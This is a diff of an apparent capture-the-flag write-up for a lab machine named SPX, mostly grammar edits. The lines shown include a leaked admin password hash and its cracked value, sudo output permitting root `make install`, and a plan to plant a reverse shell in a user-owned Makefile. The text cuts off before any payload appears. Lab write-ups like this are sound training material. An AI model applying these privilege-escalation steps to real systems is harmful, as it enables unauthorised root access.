@@ -1,4 +1,4 @@
-##### Tags: `sudo-l`  `Tinyfilemanager`  `SPX`  `makefile`  `passwd-reuse`
+##### Tags: `sudo-l`  `Tinyfilemanager`  `SPX`  `makefile`  `passwd-reuse`  `burp suite`
 
 # 🐧SPX🐧
 ## Enumeration
@@ -53,13 +53,13 @@ Cookie: filemanager=cp9hn0t4oatsde0agb7g8vn9sf
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 ```
-we got responded  with the admin hash
+we got a respond with the admin hash
 ```console
 $auth_users = array(
     'admin' => '$2y$10$7LaMUa8an8NrvnQsj5xZ3eDdOejgLyXE8IIvsC.hFy1dg7rPb9cqG',
 ```
 crack it with john the ripper  
-it take quit a while but we got it
+it takes quit a while but we finally got it
 ```console
 admin : lowprofile
 ```
@@ -88,7 +88,7 @@ profiler@spx:/home$ id
 uid=1000(profiler) gid=1000(profiler) groups=1000(profiler)
 ```
 ## Privilege Escalation
-sudo-l found we can run install command as root
+sudo-l found we can run make command inside php-spx as root
 ```console
 profiler@spx:/home$ sudo -l
 
@@ -100,15 +100,15 @@ Matching Defaults entries for profiler on spx:
 User profiler may run the following commands on spx:
     (ALL) /usr/bin/make install -C /home/profiler/php-spx
 ```
-and we owned the php-spx directory  
+since we owned the php-spx directory  
 the plan is we modify the makefile and get the root shell
 ```console
 profiler@spx:~/php-spx$ ls -la
 
 -rw-r--r--  1 profiler profiler  14798 Sep 12  2024 Makefile
 ```
-since we get not edit the file in this shell  
-we download the file to our local machine, change the shell payload to our revershell payload 
+we get not edit function of the file in this shell  
+we download the file to our local machine, change the shell payload to our reverseshell payload 
 then upload back to the target machine
 ```console
 #Makefile modification
